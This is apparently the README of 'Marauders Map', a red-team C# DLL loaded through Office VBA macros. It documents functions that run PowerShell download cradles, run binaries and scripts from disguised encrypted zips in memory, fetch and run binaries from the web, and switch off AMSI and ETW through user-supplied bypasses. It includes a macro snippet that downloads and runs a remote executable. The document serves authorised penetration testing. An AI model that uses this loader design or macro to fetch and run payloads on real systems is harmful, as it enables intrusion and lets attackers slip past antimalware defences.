# Marauders Map
The internal attacker toolkit heavily inspired by the folks of MDSec and their [SharpPack](https://www.mdsec.co.uk/2018/12/sharppack-the-insider-threat-toolkit/), highly recommend checking that post out.
<br>
The Marauders Map is meant to be used on assessments where you have gained GUI access to an enviornment. 
<br>
The Marauders Map is a DLL written in C#, enriched by the DllExport project to export functions that can serve as an entrypoint of invocation for unmanaged code such as rundll32.

Corresponding blogpost: https://blog.nviso.eu/2021/04/27/i-solemnly-swear-i-am-up-to-no-good-introducing-the-marauders-map/

## Capabilities
The power of the Marauders Map is in it's compatibility with the office suite, Marauders map is capeable of the following functionality:

* Run powershell commands such as whoami, or even full-fleged downloadcradles a la IEX(New-Object ... ) 
* Run powershell scrips from within an encrypted zip, unpacking it completely in memory
* Run C# binaries from within an encrypted zip, unpacking it completely in memory
* Run C# binaries fetched from the internet

It also has the functionality to patch AMSI and ETW, although you'll have to bring your own bypasses.


## Usage:
The DLL has one exported function called `ISolemnlySwearIAmUpToNoGood` this is the magic function you'll want to leverage as this will return a new `maraudermap` class. 

You can leverage the maraudermap like this in VBA macro format: 

```
Private Declare PtrSafe Function ISolemnlySwearIAmUpToNoGood Lib "<PATH TO YOUR COMPILED DLL WITH CORRECT OFFICE ARCHITECTURE>" () As Object

Sub test()
Dim MM As Object
Dim run

Set MM = ISolemnlySwearIAmUpToNoGood()
run = MM.RunBinaryFromWeb("https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/Watson.exe?raw=true", "G:\watsonexcel.txt", "", False, False)
End Sub

```

## Marauder Map Functions


The `RunBinaryFromEncryptedZip` function runs a binary from an encrypted zip. It should be noted that the zip does not necessarily have to be a .zip, the zip can have any name and extension, for example redteamfit.txt and the functionality will still work. 
<br>
This function has some parameters to take into account:

* zip - this needs to point to the zip location on disk
* password - the password for the encrypted zip
* outfile - the file where the output of the binary will write to
* binName - the name of the binary you want to run in the zip, the zip can contain multiple binaries, for example [Flangviks's entire sharpcollection](https://github.com/Flangvik/SharpCollection)
* arguments - arguments you want to feed to the binary, delimeter is a space
* nomoretracing - boolean to disable ETW, **needs your own ETW bypass  **
* bypassAntiMalwareScanningInterfaceForSharpies - boolean to disable AMSI **needs your own bypass**



The `RunBinaryFromWeb` function runs a binary directly from the web.
<br>
This function has some parameters to take into account:

* url - the url that points to the **direct** download of the PE
* outfile - the file where the output of the binary will write to
* arguments - arguments you want to feed to the binary, delimeter is a space
* nomoretracing - boolean to disable ETW, **needs your own ETW bypass  **
* bypassAntiMalwareScanningInterfaceForSharpies - boolean to disable AMSI **needs your own bypass**

The `RunPowerShellScriptFromEncryptedZip` function runs a poweshell script from an encrypted zip. It should be noted that the zip does not necessarily have to be a .zip, the zip can have any name and extension, for example redteamfit.txt and the functionality will still work. <br>
This function has some parameters to take into account:

* zip - this needs to point to the zip location on disk
* password - the password for the encrypted zip
* outfile - the file where the output of the script will write to
* scriptName - the name of the script you want to run in the zip, the zip can contain multiple scripts, for example [ShitSecure's powersharppack collection](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries)
* arguments - arguments you want to feed to the scipt, delimeter is a space
* bypassLogging - boolean to disable ETW, **needs your own ETW bypass  **
* bypassAntiMalwareScanningInterface - boolean to disable AMSI **needs your own bypass**


The `RunPowerShellCommand` function runs powershell, simple as that. <br>
This function has some parameters to take into account:

* command - the command you want to run, could be beneign such as whoami or could be a full downloadcradle
* outfile - the outfile where the powershell result will write itself to.
* bypassLogging - boolean to disable ETW, **needs your own ETW bypass  **
* bypassAntiMalwareScanningInterface - boolean to disable AMSI **needs your own bypass**
